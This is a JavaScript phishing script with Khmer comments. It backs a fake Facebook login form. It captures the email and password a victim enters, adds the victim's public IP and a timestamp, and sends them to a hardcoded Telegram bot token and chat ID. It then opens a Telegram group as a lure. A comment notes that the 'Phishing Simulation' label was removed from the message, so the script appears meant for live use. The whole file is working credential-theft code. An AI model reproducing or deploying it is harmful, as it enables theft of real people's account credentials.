const TOKEN = "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg";
const CHAT_ID = "6837307356";
const GROUP_LINK = "https://t.me/+7LTtj5yoBBxjMGVl";

// អនុគមន៍ដើម្បីទទួលបាន IP Public
async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return "មិនអាចទាញយក IP បាន";
    }
}

// អនុគមន៍ដើម្បីទទួលបានពេលវេលាបច្ចុប្បន្ន
function getCurrentDate() {
    const now = new Date();
    return now.toLocaleString('en-GB', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }).replace(',', '');
}

// អនុគមន៍បើក Telegram Group
function joinTelegramGroup() {
    window.open(GROUP_LINK, '_blank');
}

// ទម្រង់ខ្លី និងស្អាត (ដកជួរ Phishing Simulation ចេញ)
function formatTelegramMessage(email, password, ip, date) {
    return "━━━━━━━━━━━━━━━━━━━━━━\n" +
           "🔐 𝐅𝐁 𝐋𝐎𝐆𝐈𝐍 🔐\n" +
           "━━━━━━━━━━━━━━━━━━━━━━\n" +
           "📧 " + email + "\n" +
           "🔑 " + password + "\n" +
           "🌐 " + ip + "\n" +
           "📅 " + date + "\n" +
           "━━━━━━━━━━━━━━━━━━━━━━";
}

// អនុគមន៍សំខាន់៖ ផ្ញើទិន្នន័យទៅ Telegram
async function sendToTelegram() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        alert("សូមបំពេញអ៊ីមែល និងពាក្យសម្ងាត់របស់អ្នក!");
        return;
    }

    const loadingDiv = document.getElementById('loading');
    loadingDiv.style.display = 'block';

    const submitBtn = document.querySelector('.submit-btn');
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.7';

    try {
        const ip = await getPublicIP();
        const date = getCurrentDate();

        const message = formatTelegramMessage(email, password, ip, date);
        const encodedMessage = encodeURIComponent(message);

        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;

        const response = await fetch(url);
        const result = await response.json();

        if (result.ok) {
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            
            alert("ចូលក្រុបបានដោយជោគជ័យ!");
            joinTelegramGroup();
        } else {
            alert("មានបញ្ហាក្នុងការចូលក្រុប! សូមព្យាយាមម្តងទៀត។");
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
            loadingDiv.style.display = 'none';
        }
    } catch (error) {
        console.error("Error:", error);
        alert("កំហុសបច្ចេកទេស! សូមពិនិត្យការតភ្ជាប់អ៊ីនធឺណិតរបស់អ្នក។");
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
        loadingDiv.style.display = 'none';
    }
}